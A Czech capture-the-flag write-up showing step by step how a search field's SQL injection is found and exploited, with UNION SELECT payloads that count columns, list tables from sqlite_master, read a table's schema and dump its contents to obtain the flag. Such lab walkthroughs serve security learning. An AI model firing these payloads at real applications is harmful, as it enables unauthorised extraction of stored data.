Do vyhledávacího pole jsem vložil jednoduchý apostrof:

`'`
Server vrátil error

Timto errorem jsem zjistil že uživatelský vstup není escapován a je přímo vkládán do SQL dotazu. Aplikace je zranitelná vůči SQL Injection

Zjištění struktury

Počet sloupců
Pomocí UNION SELECT bylo testováno množství sloupců:
`' UNION SELECT NULL--` → chyba
`' UNION SELECT NULL, NULL--` → **fungovalo** (bez chyby)

Původní SELECT dotaz obsahuje 2 sloupce

Výpis tabulek
Následujícím payloadem byly vypsány názvy tabulek:

`' UNION SELECT tbl_name, NULL FROM sqlite_master WHERE type='table'--`
Byly nalezeny tabulky `config` a `users`.

Struktura tabulky `config` byla zjištěna payloadem:
`' UNION SELECT sql, NULL FROM sqlite_master WHERE type='table' AND tbl_name='config'--`

`CREATE TABLE config (key TEXT, value TEXT)`

Exfiltrace dat

Finálním payloadem byl vypsán obsah tabulky `config`:

`' UNION SELECT value, NULL FROM config--`

Tento payload vrátil hodnotu z tabulky `config`, ve které byla uložena vlajka.

vlajka:
FLAG{Sql_Un1on_M4st3r_S0SE}
